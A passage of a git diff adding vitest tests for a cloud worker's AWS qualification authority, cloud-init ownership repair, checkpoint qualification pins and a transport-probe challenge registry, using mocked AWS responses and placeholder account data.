++  let paginated = false;
++  vi.spyOn(f.signer, "execute").mockImplementation(async (service, action, region, parameters) => {
++    if (
++      ["CreateVolume", "AttachVolume", "ModifyInstanceAttribute", "DeleteVolume"].includes(action)
++    ) {
++      f.signer.calls.push({ service, action, region, parameters: structuredClone(parameters) });
++      if (action === "CreateVolume") volume = true;
++      if (action === "AttachVolume") attached = true;
++      if (action === "ModifyInstanceAttribute") dot = true;
++      if (action === "DeleteVolume") volume = false;
++      if (fault === action) {
++        fault = undefined;
++        throw new Error("lost response after effect");
++      }
++      return xml(
++        `<${action}Response>${action === "CreateVolume" ? "<volumeId>vol-33333333</volumeId>" : ""}</${action}Response>`,
++      );
++    }
++    const response = await original(service, action, region, parameters);
++    let body = (await response.text())
++      .replaceAll("i-owned", "i-11111111")
++      .replaceAll("vol-owned", "vol-55555555");
++    if (action === "TerminateInstances") attached = false;
++    if (action === "DescribeInstances")
++      body = body
++        .replaceAll(
++          "<instanceType>",
++          `<placement><availabilityZone>us-east-1a</availabilityZone></placement><instanceType>`,
++        )
++        .replaceAll(
++          "</blockDeviceMapping>",
++          `${attached ? `<item><deviceName>/dev/sdf</deviceName><ebs><volumeId>vol-33333333</volumeId><deleteOnTermination>${dot}</deleteOnTermination></ebs></item>` : ""}</blockDeviceMapping>`,
++        );
++    if (action === "DescribeVolumes") {
++      if (parameters["VolumeId.1"] === "vol-33333333" && !volume)
++        return awsError("InvalidVolume.NotFound");
++      const dataOnly = parameters["VolumeId.1"] === "vol-33333333" || parameters["Filter.2.Name"];
++      if (dataOnly)
++        body = "<DescribeVolumesResponse><volumeSet></volumeSet></DescribeVolumesResponse>";
++      if (volume && parameters["VolumeId.1"] !== "vol-55555555") {
++        const labels = {
++          crabbox_qualification_run: runIdentity.runId,
++          crabbox_qualification_owner: runIdentity.owner,
++          crabbox_qualification_sha: runIdentity.candidateSha,
++          crabbox_qualification_expiry: runIdentity.expiresAt,
++          crabbox_qualification_op: "first-walk-data",
++        };
++        body = body.replace(
++          "</volumeSet>",
++          `<item><volumeId>vol-33333333</volumeId><snapshotId>snap-22222222</snapshotId><availabilityZone>us-east-1a</availabilityZone><size>400</size><volumeType>gp3</volumeType><iops>3000</iops><throughput>125</throughput><encrypted>true</encrypted><status>${attached ? "in-use" : "available"}</status><tagSet>${Object.entries(
++            labels,
++          )
++            .map(([key, value]) => `<item><key>${key}</key><value>${value}</value></item>`)
++            .join(
++              "",
++            )}</tagSet><attachmentSet>${attached ? "<item><instanceId>i-11111111</instanceId><device>/dev/sdf</device><status>attached</status></item>" : ""}</attachmentSet></item></volumeSet>`,
++        );
++      }
++      if (paginated && !parameters["VolumeId.1"] && !parameters["Filter.2.Name"])
++        body = body.replace(
++          "</DescribeVolumesResponse>",
++          "<nextToken>more</nextToken></DescribeVolumesResponse>",
++        );
++    }
++    return new Response(body, { status: response.status });
++  });
++  return {
++    ...f,
++    identity: runIdentity,
++    paginate: (value: boolean) => {
++      paginated = value;
++    },
++    fault: (action: string) => {
++      fault = action;
++    },
++    attach: async () => {
++      for (let i = 0; i < 4; i++) {
++        try {
++          // oxlint-disable-next-line eslint/no-await-in-loop -- each retry depends on the previous persisted outcome.
++          await f.run.prepareFirstWalk(runIdentity, firstWalkRequest());
++        } catch (error) {
++          if (!/dispatched|readback/.test(String(error))) throw error;
++        }
++      }
++    },
++  };
++}
++
++function legacyPolicyHash(policy: Record<string, unknown>): string {
++  return createHash("sha256")
++    .update(
++      JSON.stringify(
++        Object.fromEntries(Object.entries(policy).toSorted(([a], [b]) => a.localeCompare(b))),
++      ),
++    )
++    .digest("hex");
++}
++
++async function persistLegacyPolicy(fixture: ReturnType<typeof authorityFixture>) {
++  const stored = (await fixture.storage.get<Record<string, unknown>>("run"))!;
++  const policy = stored["policy"] as Record<string, unknown>;
++  delete policy["roleArn"];
++  stored["policyHash"] = legacyPolicyHash(policy);
++  await fixture.storage.put("run", stored);
++  return stored;
++}
++
+ function authorityFixture(
+   options: {
+     borrowedInventory?: boolean;
+@@ -2384,6 +3051,8 @@ function authorityFixture(
+   const signer = new FakeSigner(options);
+   const env = {
+     CRABBOX_AWS_QUALIFICATION_ACCOUNT_ID: "123456789012",
++    CRABBOX_AWS_QUALIFICATION_ROLE_ARN:
++      "arn:aws:iam::123456789012:role/qualification/Qualification",
+     CRABBOX_AWS_QUALIFICATION_AUTHORITY_SHA: "b".repeat(40),
+     CRABBOX_AWS_QUALIFICATION_AUTHORITY_VERSION: "qualification-v1",
+     CRABBOX_AWS_QUALIFICATION_BASE_AMI_ID: "ami-base",
+@@ -2439,8 +3108,11 @@ function authorityHTTPFixture(runIdentity: AWSQualificationRunIdentity) {
+   vi.stubGlobal("fetch", fetch);
+   let run = new AWSQualificationRun({ storage: fixture.storage } as never, env as never);
+   const registryStorage = new MemoryStorage();
+-  const registry = new AWSQualificationRegistry({ storage: registryStorage } as never, {} as never);
+   const namespace = { idFromName: (name: string) => name, get: () => run };
++  const registry = new AWSQualificationRegistry(
++    { storage: registryStorage } as never,
++    { AWS_QUALIFICATION_RUNS: namespace } as never,
++  );
+   const bindings = {
+     AWS_QUALIFICATION_RUNS: namespace,
+     AWS_QUALIFICATION_REGISTRY: { idFromName: (name: string) => name, get: () => registry },
+@@ -2559,6 +3231,7 @@ class FakeSigner {
+     parameters: Record<string, unknown>;
+   }> = [];
+   accountId = "123456789012";
++  principalArn: string | undefined;
+   ownerId: string | undefined;
+   advanceNextIdentityByMs = 0;
+   instanceDescribeNotFound = false;
+@@ -2618,7 +3291,7 @@ class FakeSigner {
+         vi.setSystemTime(new Date(Date.now() + advanceBy));
+       }
+       return xml(
+-        `<GetCallerIdentityResponse><GetCallerIdentityResult><Account>${this.accountId}</Account></GetCallerIdentityResult></GetCallerIdentityResponse>`,
++        `<GetCallerIdentityResponse><GetCallerIdentityResult><Account>${this.accountId}</Account><Arn>${this.principalArn ?? `arn:aws:sts::${this.accountId}:assumed-role/Qualification/qualification-test`}</Arn></GetCallerIdentityResult></GetCallerIdentityResponse>`,
+       );
+     }
+     if (action === "DescribeKeyPairs") {
+@@ -2914,3 +3587,60 @@ function awsServerError(): Response {
+ function xml(body: string): Response {
+   return new Response(body, { status: 200, headers: { "content-type": "text/xml" } });
+ }
++
++describe("pure controller binding identity", () => {
++  const version = "11111111-2222-4333-8444-555555555555";
++  const challenge = "c".repeat(64);
++  function pure(props: unknown = controller, metadata: unknown = { id: version }) {
++    // Accessing any other environment capability fails the test, including DO
++    // stubs, credentials, the signer or an expired logical authority identity.
++    const env = new Proxy(
++      { CF_VERSION_METADATA: metadata },
++      {
++        get(target, key) {
++          if (key === "CF_VERSION_METADATA") return target.CF_VERSION_METADATA;
++          throw new Error(`unexpected environment access: ${String(key)}`);
++        },
++      },
++    );
++    return new AWSQualificationController(env as never, props as never);
++  }
++  it("returns cloned actual props and executing version without state or network", async () => {
++    const network = vi.fn<() => never>(() => {
++      throw new Error("network forbidden");
++    });
++    vi.stubGlobal("fetch", network);
++    const props = { deploymentHash: "b".repeat(64) };
++    const reply = await pure(props).bindingIdentity(challenge);
++    expect(reply).toEqual({
++      protocol: 1,
++      role: "controller",
++      challenge,
++      props,
++      authorityVersion: version,
++    });
++    reply.props.deploymentHash = "a".repeat(64);
++    expect(props.deploymentHash).toBe("b".repeat(64));
++    expect(network).not.toHaveBeenCalled();
++  });
++  it.each([null, {}, { deploymentHash: "bad" }, { deploymentHash: "a".repeat(64), extra: true }])(
++    "rejects incomplete or extra bound props %j without state",
++    async (props) => {
++      await expect(pure(props).bindingIdentity(challenge)).rejects.toThrow("binding identity");
++    },
++  );
++  it.each(["", "a".repeat(65), "G".repeat(64), {}, null])(
++    "rejects malformed challenge %j",
++    async (value) => {
++      await expect(pure().bindingIdentity(value as never)).rejects.toThrow("binding identity");
++    },
++  );
++  it.each([{}, { id: "stale" }, { id: "" }])(
++    "rejects absent/invalid executing version %j",
++    async (value) => {
++      await expect(pure(controller, value).bindingIdentity(challenge)).rejects.toThrow(
++        "binding identity",
++      );
++    },
++  );
++});
+diff --git a/worker/test/bootstrap-ownership.test.ts b/worker/test/bootstrap-ownership.test.ts
+index c7661399b847d0b513eff4b3d1a14dd6bc298c43..e9a720a6adee6a0a9766cbcb57ac88c24de43648 100644
+--- a/worker/test/bootstrap-ownership.test.ts
++++ b/worker/test/bootstrap-ownership.test.ts
+@@ -1,5 +1,6 @@
+ import { spawnSync } from "node:child_process";
+ import {
++  chmodSync,
+   lchownSync,
+   lstatSync,
+   mkdirSync,
+@@ -58,14 +59,31 @@ function run(script: string) {
+   });
+   expect(result.stderr).toBe("");
+   expect(result.status).toBe(0);
++  return result.stdout;
++}
++
++function summary(output: string) {
++  const match = output.match(
++    /^crabbox ownership-repair state=complete visited=(\d+) mismatched=(\d+) changed=(\d+) elapsed_seconds=\d+\.\d{3}$/m,
++  );
++  expect(match).not.toBeNull();
++  return match!.slice(1).map(Number);
++}
++
++function repairOnly(work: string, cache: string): string {
++  const script = ownershipScript(work, cache);
++  // Keep the real emitted repair, omitting the directory-creation prelude.
++  return script.slice(script.indexOf("# Resolve the original user:"));
+ }
+ 
+ describe("cloud-init ownership repair", () => {
+   it("emits a physical, descriptor-anchored numeric ownership repair", () => {
+     const script = ownershipScript("/work/fixture's tree", "/tmp/cache");
+-    expect(script).toContain("python3 -I - 'root' '/work/fixture'\\''s tree'");
+-    expect(script).toContain("uid = pwd.getpwnam(sys.argv[1]).pw_uid");
+-    expect(script).toContain("gid = grp.getgrnam(sys.argv[1]).gr_gid");
++    expect(script).toContain(
++      "python3 -I - crabbox-ownership-repair-v1 'root' '/work/fixture'\\''s tree'",
++    );
++    expect(script).toContain("uid = pwd.getpwnam(sys.argv[2]).pw_uid");
++    expect(script).toContain("gid = grp.getgrnam(sys.argv[2]).gr_gid");
+     expect(script).toContain("if info.st_uid != uid or info.st_gid != gid:");
+     expect(script).toContain(
+       "os.chown(name, uid, gid, dir_fd=directory_fd, follow_symlinks=False)",
+@@ -114,7 +132,15 @@ describe("cloud-init ownership repair", () => {
+         }
+         const before = new Map(paths.map((path) => [path, metadata(path)]));
+         const external = new Map(entries(outside).map((path) => [path, metadata(path)]));
+-        run(ownershipScript(work, cache));
++        const mismatches = paths.filter((path) => {
++          const old = before.get(path)!;
++          return old.uid !== 0n || old.gid !== 0n;
++        }).length;
++        expect(summary(run(ownershipScript(work, cache)))).toEqual([
++          paths.length,
++          mismatches,
++          mismatches,
++        ]);
+         for (const path of paths) {
+           const after = metadata(path);
+           expect({ path, uid: after.uid, gid: after.gid }).toEqual({ path, uid: 0n, gid: 0n });
+@@ -131,7 +157,7 @@ describe("cloud-init ownership repair", () => {
+         for (const [path, old] of external)
+           expect({ path, ...metadata(path) }).toEqual({ path, ...old });
+         const repaired = new Map(paths.map((path) => [path, metadata(path)]));
+-        run(ownershipScript(work, cache));
++        expect(summary(run(ownershipScript(work, cache)))).toEqual([paths.length, 0, 0]);
+         for (const [path, old] of repaired)
+           expect({ path, ...metadata(path) }).toEqual({ path, ...old });
+       } finally {
+@@ -204,4 +230,121 @@ describe("cloud-init ownership repair", () => {
+       }
+     },
+   );
++
++  it.skipIf(process.platform !== "linux")(
++    "reports a failed walk without swallowing its error or continuing bootstrap",
++    () => {
++      const fixture = mkdtempSync(join(tmpdir(), "crabbox-ownership-failure-"));
++      try {
++        const script = ownershipScript(join(fixture, "missing"), join(fixture, "cache"));
++        // Omit directory creation to exercise a real stat failure in the emitted walk.
++        const repair = script.slice(script.indexOf("# Resolve the original user:"));
++        const result = spawnSync("bash", ["-euo", "pipefail", "-c", `${repair}\necho continued`], {
++          encoding: "utf8",
++        });
++        expect(result.status).not.toBe(0);
++        expect(result.stderr).toContain("FileNotFoundError");
++        expect(result.stdout).toMatch(
++          /^crabbox ownership-repair state=failed visited=0 mismatched=0 changed=0 elapsed_seconds=\d+\.\d{3}$/m,
++        );
++        expect(result.stdout).not.toContain("state=complete");
++        expect(result.stdout).not.toContain("continued");
++      } finally {
++        rmSync(fixture, { recursive: true, force: true });
++      }
++    },
++  );
++
++  it.skipIf(process.platform !== "linux" || process.getuid?.() !== 0)(
++    "retains completed repairs after a later root fails and safely retries",
++    () => {
++      const fixture = mkdtempSync(join(tmpdir(), "crabbox-ownership-retry-"));
++      try {
++        const work = join(fixture, "work");
++        const cache = join(fixture, "cache");
++        mkdirSync(work);
++        writeFileSync(join(work, "file"), "fixture\n");
++        for (const path of entries(work)) lchownSync(path, 12345, 23456);
++        const result = spawnSync(
++          "bash",
++          ["-euo", "pipefail", "-c", `${repairOnly(work, cache)}\necho continued`],
++          { encoding: "utf8" },
++        );
++        expect(result.status).not.toBe(0);
++        expect(result.stderr).toContain("FileNotFoundError");
++        expect(result.stdout).toMatch(
++          /^crabbox ownership-repair state=failed visited=2 mismatched=2 changed=2 elapsed_seconds=\d+\.\d{3}$/m,
++        );
++        expect(result.stdout).not.toContain("state=complete");
++        expect(result.stdout).not.toContain("continued");
++        const repaired = new Map(entries(work).map((path) => [path, metadata(path)]));
++        for (const old of repaired.values()) expect([old.uid, old.gid]).toEqual([0n, 0n]);
++        mkdirSync(cache);
++        writeFileSync(join(cache, "remaining"), "fixture\n");
++        lchownSync(join(cache, "remaining"), 12345, 23456);
++        expect(summary(run(repairOnly(work, cache)))).toEqual([4, 1, 1]);
++        for (const [path, old] of repaired) expect(metadata(path)).toEqual(old);
++        expect([
++          metadata(join(cache, "remaining")).uid,
++          metadata(join(cache, "remaining")).gid,
++        ]).toEqual([0n, 0n]);
++      } finally {
++        rmSync(fixture, { recursive: true, force: true });
++      }
++    },
++  );
++
++  it
++    .skipIf(process.platform !== "linux" || process.getuid?.() !== 0)
++    .each(["ownership update", "directory read"])(
++    "fails closed on denied %s and recovers on an authorized retry",
++    (operation) => {
++      const fixture = mkdtempSync(join(tmpdir(), "crabbox-ownership-permission-"));
++      try {
++        // A child without root privileges must reach our fixture, but cannot
++        // change another user's inode or read a root-only directory.
++        chmodSync(fixture, 0o755);
++        const work = join(fixture, "work");
++        const cache = join(fixture, "cache");
++        mkdirSync(work);
++        mkdirSync(cache);
++        const denied = join(work, "denied");
++        if (operation === "directory read") {
++          mkdirSync(denied, 0o700);
++          writeFileSync(join(denied, "file"), "fixture\n");
++          lchownSync(join(denied, "file"), 12345, 23456);
++        } else {
++          writeFileSync(denied, "fixture\n");
++          lchownSync(denied, 12345, 23456);
++        }
++        const before = new Map(entries(work).map((path) => [path, metadata(path)]));
++        const result = spawnSync(
++          "bash",
++          ["-euo", "pipefail", "-c", `${repairOnly(work, cache)}\necho continued`],
++          { encoding: "utf8", uid: 65534, gid: 65534 },
++        );
++        expect(result.error).toBeUndefined();
++        expect(result.status).not.toBe(0);
++        expect(result.stderr).toContain("PermissionError");
++        expect(result.stdout).toMatch(
++          new RegExp(
++            `^crabbox ownership-repair state=failed visited=2 mismatched=${operation === "ownership update" ? 1 : 0} changed=0 elapsed_seconds=\\d+\\.\\d{3}$`,
++            "m",
++          ),
++        );
++        expect(result.stdout).not.toContain("state=complete");
++        expect(result.stdout).not.toContain("continued");
++        for (const [path, old] of before) expect(metadata(path)).toEqual(old);
++        expect(summary(run(repairOnly(work, cache)))).toEqual([before.size + 1, 1, 1]);
++        for (const path of before.keys()) {
++          const after = metadata(path);
++          expect([after.uid, after.gid]).toEqual([0n, 0n]);
++        }
++        const retained = [...before].filter(([, old]) => old.uid === 0n && old.gid === 0n);
++        for (const [path, old] of retained) expect(metadata(path)).toEqual(old);
++      } finally {
++        rmSync(fixture, { recursive: true, force: true });
++      }
++    },
++  );
+ });
+diff --git a/worker/test/checkpoints.test.ts b/worker/test/checkpoints.test.ts
+index 39deae3c299a7c9301ebb7b5f009026cfc3132dd..dfadf92fcf41b31a6f8dc1295c83dc7ea1aebf58 100644
+--- a/worker/test/checkpoints.test.ts
++++ b/worker/test/checkpoints.test.ts
+@@ -2,6 +2,10 @@ import { afterEach, describe, expect, it, vi } from "vitest";
+ 
+ import {
+   CheckpointError,
++  holdCheckpointQualificationUse,
++  settleCheckpointQualificationUse,
++  finishCheckpointUse,
++  acquireCheckpointUse,
+   abortCheckpointProvisioningForLease,
+   expireCheckpointClaims,
+   backfillFailedCheckpointCreateRecovery,
+@@ -6198,6 +6202,130 @@ describe("coordinator-managed checkpoints", () => {
+     expect(await storage.get(checkpointKey(pending.id))).toMatchObject({ pinCount: 1 });
+   });
+ 
++  it("holds qualification use through readiness, expiry, cancellation and uncertain cleanup until exact run settlement", async () => {
++    vi.useFakeTimers();
++    vi.setSystemTime(new Date("2026-08-20T12:00:00.000Z"));
++    const { coordinator, storage } = await checkpointFixture();
++    const id = "chk_first_walk_pin";
++    await createCheckpoint(coordinator, id);
++    const principal = { owner: "alice@example.com", org };
++    const { token } = await acquireCheckpointUse(storage, id, principal);
++    const binding = { runID: "qualification-one", deploymentHash: "a".repeat(64) };
++    await holdCheckpointQualificationUse(storage, id, token, principal, binding);
++    vi.setSystemTime(Date.now() + 3 * 60 * 60_000);
++    await expireCheckpointClaims(storage, id);
++    // Deletion and the old completion/abort endpoint must not consume this pin.
++    await expect(claimCheckpointDeletion(storage, id, principal, "manual")).rejects.toThrow(
++      "active use",
++    );
++    await expect(finishCheckpointUse(storage, id, token, principal, false)).rejects.toThrow(
++      "settlement",
++    );
++    await expect(finishCheckpointUse(storage, id, token, principal, true)).rejects.toThrow(
++      "settlement",
++    );
++    await expect(
++      holdCheckpointQualificationUse(storage, id, token, principal, { ...binding, runID: "other" }),
++    ).rejects.toThrow("another lifecycle");
++    await expect(
++      settleCheckpointQualificationUse(storage, id, token, principal, {
++        ...binding,
++        finalized: false,
++      }),
++    ).rejects.toThrow("not settled");
++    await expect(
++      settleCheckpointQualificationUse(storage, id, token, principal, {
++        ...binding,
++        deploymentHash: "b".repeat(64),
++        finalized: true,
++      }),
++    ).rejects.toThrow("binding mismatch");
++    expect(await storage.get(checkpointKey(id))).toMatchObject({ activeUseCount: 1 });
++    // A failed prepare-before-RPC has no request; final run fencing/zero inventory
++    // still proves that it can no longer create a copy and safely releases it.
++    await settleCheckpointQualificationUse(storage, id, token, principal, {
++      ...binding,
++      finalized: true,
++    });
++    await settleCheckpointQualificationUse(storage, id, token, principal, {
++      ...binding,
++      finalized: true,
++    });
++    expect(await storage.get(checkpointKey(id))).toMatchObject({ activeUseCount: 0 });
++    await expect(claimCheckpointDeletion(storage, id, principal, "manual")).resolves.toBeDefined();
++  });
++
++  it("persists qualification pin before attachment RPC and settles only after bound authority finalization", async () => {
++    const f = await checkpointFixture();
++    const id = "chk_first_walk_route";
++    await createCheckpoint(f.coordinator, id);
++    const acquired = await acquireCheckpointUse(f.storage, id, { owner: "alice@example.com", org });
++    let finalized = false;
++    const prepare = vi.fn<() => Promise<never>>(async () => {
++      const claims = [
++        ...(
++          await f.storage.list<CoordinatorCheckpointUseClaim>({ prefix: `checkpoint-use:${id}:` })
++        ).values(),
++      ];
++      expect(claims[0]?.qualification).toEqual({
++        runID: "run-one",
++        deploymentHash: "a".repeat(64),
++      });
++      throw new Error("uncertain attach response");
++    });
++    f.env.CRABBOX_AWS_QUALIFICATION_TRANSPORT = {
++      execute: vi.fn<NonNullable<Env["CRABBOX_AWS_QUALIFICATION_TRANSPORT"]>["execute"]>(),
++      prepareFirstWalk: prepare,
++      firstWalkStatus: async () => ({
++        runID: "run-one",
++        deploymentHash: "a".repeat(64),
++        finalized,
++      }),
++    };
++    const response = await f.coordinator.fetch(
++      checkpointRequest(
++        "POST",
++        `/v1/checkpoints/${id}/first-walk`,
++        {
++          action: "prepare",
++          claim: acquired.token,
++          leaseID,
++          readinessReceiptSha256: "b".repeat(64),
++        },
++        { admin: true },
++      ),
++    );
++    expect(response.status).toBeGreaterThanOrEqual(500);
++    expect(prepare).toHaveBeenCalledTimes(1);
++    const settle = () =>
++      f.coordinator.fetch(
++        checkpointRequest(
++          "POST",
++          `/v1/checkpoints/${id}/first-walk`,
++          { action: "settle", claim: acquired.token },
++          { admin: true },
++        ),
++      );
++    expect((await settle()).status).toBe(409);
++    finalized = true;
++    expect((await settle()).status).toBe(200);
++    expect(await f.storage.get(checkpointKey(id))).toMatchObject({ activeUseCount: 0 });
++  });
++
++  it("does not expose first-walk mutation or settlement outside the qualification binding", async () => {
++    const { coordinator } = await checkpointFixture();
++    await createCheckpoint(coordinator, "chk_no_first_walk");
++    const result = await coordinator.fetch(
++      checkpointRequest(
++        "POST",
++        "/v1/checkpoints/chk_no_first_walk/first-walk",
++        { action: "prepare", claim: "fake" },
++        { admin: true },
++      ),
++    );
++    expect(result.status).toBe(404);
++  });
++
+   it("reclaims expired independent fork claims without advancing last use", async () => {
+     vi.useFakeTimers();
+     vi.setSystemTime(new Date("2026-08-20T12:00:00.000Z"));
+diff --git a/worker/test/qualification-transport-probe.test.ts b/worker/test/qualification-transport-probe.test.ts
+new file mode 100644
+index 0000000000000000000000000000000000000000..c3f7154271c48b33a08145d8cc946ea1e80962fd
+--- /dev/null
++++ b/worker/test/qualification-transport-probe.test.ts
+@@ -0,0 +1,307 @@
++import { afterEach, describe, expect, it, vi } from "vitest";
++
++import {
++  AWSQualificationController,
++  AWSQualificationRegistry,
++  AWSQualificationTransport,
++} from "../src/aws-qualification-authority";
++import type {
++  AWSQualificationRunIdentity,
++  AWSQualificationTransportProbeRequest,
++} from "../src/aws-qualification-contract";
++import { routeCoordinatorRequest } from "../src/coordinator-entry";
++import { qualificationTransportProbeResponse } from "../src/qualification-transport-probe";
++import type { Env } from "../src/types";
++
++const version = "11111111-1111-1111-1111-111111111111";
++const controller = { deploymentHash: "d".repeat(64) };
++afterEach(() => {
++  vi.restoreAllMocks();
++  vi.unstubAllGlobals();
++  vi.useRealTimers();
++});
++class Storage {
++  values = new Map<string, unknown>();
++  async get<T>(key: string): Promise<T | undefined> {
++    return structuredClone(this.values.get(key)) as T | undefined;
++  }
++  async put(key: string, value: unknown): Promise<void> {
++    this.values.set(key, structuredClone(value));
++  }
++}
++function fixture() {
++  const storage = new Storage();
++  const identity: AWSQualificationRunIdentity = {
++    runId: "image-qualification-42-1",
++    owner: "maintainer",
++    candidateSha: "a".repeat(40),
++    candidateWorker: "crabbox-image-qualification-42-1",
++    ...controller,
++    expiresAt: new Date(Date.now() + 60 * 60_000).toISOString(),
++    firstWalk: true,
++  };
++  const request: AWSQualificationTransportProbeRequest = {
++    identity,
++    challenge: "b".repeat(64),
++    authorityVersion: version,
++    candidateVersion: version,
++    expiresAt: new Date(Date.now() + 9 * 60_000).toISOString(),
++  };
++  const enroll = vi.fn<() => Promise<void>>(async () => {});
++  const runNamespace = { idFromName: (id: string) => id, get: () => ({ enroll }) };
++  const registry = new AWSQualificationRegistry(
++    { storage } as never,
++    { CF_VERSION_METADATA: { id: version }, AWS_QUALIFICATION_RUNS: runNamespace } as never,
++  );
++  const env = {
++    CF_VERSION_METADATA: { id: version },
++    AWS_QUALIFICATION_REGISTRY: { idFromName: (id: string) => id, get: () => registry },
++    AWS_QUALIFICATION_RUNS: runNamespace,
++  };
++  const transport = new AWSQualificationTransport(env as never, identity);
++  const trusted = new AWSQualificationController(env as never, controller);
++  const reopen = () =>
++    new AWSQualificationRegistry(
++      { storage } as never,
++      { CF_VERSION_METADATA: { id: version }, AWS_QUALIFICATION_RUNS: runNamespace } as never,
++    );
++  return { storage, identity, request, registry, transport, trusted, env, enroll, reopen };
++}
++describe("canonical pre-enrollment transport challenge", () => {
++  it("observes actual bound props/version, settles once, then admits enrollment", async () => {
++    const f = fixture();
++    vi.stubGlobal(
++      "fetch",
++      vi.fn<typeof globalThis.fetch>(() => {
++        throw Error("no network");
++      }),
++    );
++    expect(await f.trusted.openTransportProbe(f.request)).toMatchObject({ state: "pending" });
++    await f.transport.observeBinding(f.request.challenge);
++    expect(await f.trusted.discoverTransportProbe()).toEqual({
++      protocol: 1,
++      ...f.request,
++      state: "observed",
++      observedAt: expect.any(String),
++    });
++    expect(f.enroll).not.toHaveBeenCalled();
++    await f.trusted.settleTransportProbe(f.request.challenge, true);
++    await f.trusted.claim(f.identity);
++    expect(f.enroll).toHaveBeenCalledOnce();
++    await expect(
++      f.trusted.openTransportProbe({ ...f.request, challenge: "c".repeat(64) }),
++    ).rejects.toThrow("active");
++    expect(fetch).not.toHaveBeenCalled();
++    expect([...f.storage.values.keys()].toSorted()).toEqual(["active", "transport-probe"]);
++  });
++  for (const state of ["pending", "observed", "expired"] as const)
++    it(`blocks new and legacy claims and idle discovery while ${state}`, async () => {
++      const f = fixture();
++      await f.trusted.openTransportProbe(f.request);
++      if (state === "observed") await f.transport.observeBinding(f.request.challenge);
++      if (state === "expired") vi.spyOn(Date, "now").mockReturnValue(Date.now() + 10 * 60_000);
++      await expect(f.trusted.claim(f.identity)).rejects.toThrow("unsettled");
++      await expect(f.registry.claim(controller, f.identity)).rejects.toThrow("unsettled");
++      await expect(f.trusted.discover()).rejects.toThrow("unsettled");
++      expect(f.enroll).not.toHaveBeenCalled();
++      await f.trusted.settleTransportProbe(f.request.challenge, false);
++      await expect(f.trusted.claim(f.identity)).rejects.toThrow("cancelled");
++    });
++  for (const key of [
++    "owner",
++    "runId",
++    "candidateSha",
++    "candidateWorker",
++    "deploymentHash",
++    "expiresAt",
++    "firstWalk",
++    "extra",
++  ] as const)
++    it(`rejects wrong/extra actual props: ${key}`, async () => {
++      const f = fixture();
++      await f.trusted.openTransportProbe(f.request);
++      const props = { ...f.identity, [key]: key === "firstWalk" ? undefined : "wrong" };
++      const transport = new AWSQualificationTransport(f.env as never, props as never);
++      await expect(transport.observeBinding(f.request.challenge)).rejects.toThrow(
++        /transport|qualification/i,
++      );
++      expect((await f.trusted.discoverTransportProbe())?.state).toBe("pending");
++      expect(f.enroll).not.toHaveBeenCalled();
++    });
++  it("rejects forged response without observation, wrong challenge/version, replay and extra arguments", async () => {
++    const f = fixture();
++    await f.trusted.openTransportProbe(f.request);
++    await expect(f.trusted.settleTransportProbe(f.request.challenge, true)).rejects.toThrow(
++      "not observed",
++    );
++    await expect(f.transport.observeBinding("c".repeat(64))).rejects.toThrow(
++      /transport|qualification/i,
++    );
++    await expect(
++      f.registry.observeTransport(
++        f.identity,
++        f.request.challenge,
++        "22222222-2222-2222-2222-222222222222",
++      ),
++    ).rejects.toThrow(/transport|qualification/i);
++    await expect(
++      (f.transport.observeBinding as (...args: unknown[]) => Promise<void>)(
++        f.request.challenge,
++        f.identity,
++      ),
++    ).rejects.toThrow(/transport|qualification/i);
++    await f.transport.observeBinding(f.request.challenge);
++    await expect(f.transport.observeBinding(f.request.challenge)).rejects.toThrow(
++      /transport|qualification/i,
++    );
++    await f.trusted.settleTransportProbe(f.request.challenge, true);
++    await expect(f.transport.observeBinding(f.request.challenge)).rejects.toThrow(
++      /transport|qualification/i,
++    );
++    await expect(f.trusted.openTransportProbe(f.request)).rejects.toThrow("settled");
++    await expect(
++      f.trusted.openTransportProbe({ ...f.request, challenge: "c".repeat(64) }),
++    ).rejects.toThrow("tombstone");
++  });
++  it("rejects malformed request, extra fields, expired proof, wrong authority and oversized identity", async () => {
++    const f = fixture();
++    for (const request of [
++      { ...f.request, extra: true },
++      { ...f.request, expiresAt: new Date(Date.now() - 1).toISOString() },
++      { ...f.request, expiresAt: new Date(Date.now() + 11 * 60_000).toISOString() },
++      { ...f.request, authorityVersion: "22222222-2222-2222-2222-222222222222" },
++      { ...f.request, identity: { ...f.identity, owner: "x".repeat(300) } },
++    ])
++      // eslint-disable-next-line no-await-in-loop -- verify no rejected attempt admits state
++      await expect(f.trusted.openTransportProbe(request)).rejects.toThrow(
++        /transport|qualification/i,
++      );
++    await f.trusted.openTransportProbe(f.request);
++    await f.transport.observeBinding(f.request.challenge);
++    vi.spyOn(Date, "now").mockReturnValue(Date.now() + 10 * 60_000);
++    await expect(f.trusted.settleTransportProbe(f.request.challenge, true)).rejects.toThrow(
++      /transport|qualification/i,
++    );
++    await f.trusted.settleTransportProbe(f.request.challenge, false);
++    expect(f.storage.values.size).toBe(1);
++  });
++  it("recovers the same durable slot after every effect, with no new admission", async () => {
++    const f = fixture();
++    await f.trusted.openTransportProbe(f.request);
++    let registry = f.reopen();
++    await registry.openTransportProbe(controller, f.request); // uncertain open is idempotent
++    await registry.observeTransport(f.identity, f.request.challenge, version);
++    registry = f.reopen();
++    expect((await registry.discoverTransportProbe({ deploymentHash: "e".repeat(64) }))?.state).toBe(
++      "observed",
++    );
++    await expect(
++      registry.settleTransportProbe({ deploymentHash: "e".repeat(64) }, f.request.challenge, false),
++    ).rejects.toThrow(/transport|qualification/i);
++    await registry.settleTransportProbe(controller, f.request.challenge, false);
++    registry = f.reopen();
++    expect(
++      (await registry.settleTransportProbe(controller, f.request.challenge, false)).state,
++    ).toBe("cancelled");
++    await expect(
++      registry.settleTransportProbe(controller, f.request.challenge, true),
++    ).rejects.toThrow(/transport|qualification/i);
++    expect(f.storage.values.size).toBe(1);
++    expect(f.enroll).not.toHaveBeenCalled();
++  });
++  it("serializes probe admission against the entire enrollment hop", async () => {
++    const f = fixture();
++    const entered = Promise.withResolvers<void>();
++    const release = Promise.withResolvers<void>();
++    f.enroll.mockImplementation(async () => {
++      entered.resolve();
++      await release.promise;
++    });
++    const claim = f.trusted.claim(f.identity);
++    await entered.promise;
++    const probe = f.trusted.openTransportProbe(f.request);
++    void probe.catch(() => {});
++    release.resolve();
++    await claim;
++    await expect(probe).rejects.toThrow("active");
++    expect(f.enroll).toHaveBeenCalledOnce();
++  });
++  it("bounds queued registry operations and releases capacity after settlement", async () => {
++    const f = fixture();
++    const entered = Promise.withResolvers<void>();
++    const release = Promise.withResolvers<void>();
++    f.enroll.mockImplementationOnce(async () => {
++      entered.resolve();
++      await release.promise;
++    });
